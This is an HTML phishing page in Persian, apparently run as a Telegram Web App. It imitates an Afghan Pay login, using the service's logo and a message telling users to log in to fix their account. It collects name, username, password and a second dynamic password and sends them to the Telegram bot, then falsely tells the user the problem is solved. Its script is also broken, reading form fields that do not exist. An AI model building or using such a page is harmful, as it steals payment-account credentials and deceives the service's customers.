<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>برای حل مشکل لاگین کنید</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
body { font-family: Vazir, Tahoma, sans-serif; background:#f0f2f5; }
.card { max-width:400px; margin:50px auto; padding:20px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
</style>
</head>
<body>

<div class="card">
  <div class="text-center mb-3">
    <img src="https://ers.afghan-pay.com/assets/images/logo.png" style="width:100px">
    <h4 class="mt-2">برای حل مشکل لاگین کنید</h4>
  </div>

  <input type="text" id="name" class="form-control mb-3" placeholder="نام">
  <input type="text" id="user" class="form-control mb-3" placeholder="یوزرنیم یا آیدی حساب کاربری">
  <input type="text" id="password" class="form-control mb-3" placeholder="پسورد">
  <input type="text" id="password2" class="form-control mb-3" placeholder="رمز دوم ( پویا )">

  <button class="btn btn-primary w-100" onclick="sendData()">لاگین</button>
</div>

<script>
const tg = window.Telegram.WebApp;
tg.expand();
function sendData(){
  const data = {
    name: document.getElementById('name').value,
    father: document.getElementById('father').value,
    phone: document.getElementById('phone').value,
    class: document.getElementById('class').value
  };
  Telegram.WebApp.sendData(JSON.stringify(data));
  alert("مشکل حسابتان رفع شد از خدمات افغان پی لذت ببرید");
}
</script>

</body>
</html>
